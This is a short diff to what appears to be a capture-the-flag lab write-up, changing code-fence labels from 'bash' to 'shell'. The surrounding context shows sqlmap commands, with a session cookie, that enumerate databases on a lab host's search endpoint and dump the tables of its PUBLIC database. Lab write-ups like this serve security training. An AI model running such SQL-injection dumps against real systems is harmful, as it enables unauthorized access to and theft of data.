@@ -198,7 +198,7 @@ by Ben "epi" Risher 🤓                 ver: 2.13.1
 
 > Let's try sqlmap to dump tables for this one:
 
-```bash
+```shell
 sqlmap -u "http://iron.thm:8080/inmates/search?q=test" \
   --dbs \
   --batch --cookie='JSESSIONID=4DE65F6695C9A941B66F94B91F610BA4' --level 5 
@@ -237,7 +237,7 @@ available databases [2]:
 
 > We found 2 databases - public, and information_schema. Let's extract tables, and dump them.
 
-```bash
+```shell
 sqlmap -u "http://iron.thm:8080/inmates/search?q=test" \
   -D PUBLIC \
   --batch --cookie='JSESSIONID=4DE65F6695C9A941B66F94B91F610BA4' --level 5 --tables --dump
